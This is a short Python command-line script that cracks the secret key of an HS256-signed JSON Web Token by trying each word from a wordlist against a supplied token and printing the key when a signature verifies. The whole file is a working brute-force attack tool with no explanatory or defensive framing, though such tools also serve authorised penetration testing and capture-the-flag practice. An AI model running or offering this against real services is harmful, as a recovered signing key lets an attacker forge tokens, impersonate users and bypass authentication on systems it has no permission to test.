import sys
import os
import jwt

if len(sys.argv) < 3:
    print("Not enough arguments")
    print("Usage: jwtdecode.py [wordlist] [encoded jwt]")
    exit()

encoded_jwt = sys.argv[2]

found = False
secret = ""

f = open(sys.argv[1], "r")
counter = 1
for word in f:
    word = word.strip();

    try:
        decoded_jwt = jwt.decode(encoded_jwt, f"{word}", algorithms=["HS256"])
    except jwt.InvalidSignatureError:
        print(f"{counter}: \"{word}\" [Invalid]")
        counter += 1
    except jwt.ExpiredSignatureError:
        print(f"{counter}: \"{word}\" [Valid]")
        found = True
        secret = word
        break
    except Exception as e:
        print(f"Error: {e}")
        print("Exiting...")
        exit()
    else:
        print(f"{counter}: \"{word}\" [Valid]")
        found = True
        secret = word
        break

f.close()

print("")
print("================")
if found:
    print("FOUND!")
    print(f"JWT Secret: {secret}")
else:
    print("NOT FOUND :(")
print("================")
